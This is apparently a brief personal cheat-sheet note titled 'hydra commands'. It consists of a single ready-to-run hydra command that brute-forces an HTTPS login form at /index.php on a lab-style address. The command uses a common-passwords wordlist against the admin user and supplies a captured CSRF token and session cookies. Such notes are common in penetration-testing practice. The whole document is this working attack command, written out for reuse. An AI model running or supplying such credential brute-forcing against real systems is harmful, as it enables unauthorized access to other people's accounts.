# hydra commands
- brute force a login at /index.php with headers over https
```
hydra -L users.txt -P '/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt' 10.10.10.60 -S -s 443 http-post-form "/index.php:__csrf_magic=sid%3A2983ce3e22fdf5b264dd8a800638c01ae0b4b95c%2C1588990012&usernamefld=admin&passwordfld=^PASS^&login=Login:Username or Password incorrect:H=Cookie: PHPSESSID=71e0a0a5515c37964575c7cb1fd9fa3c; cookie_test=1588993667"
```
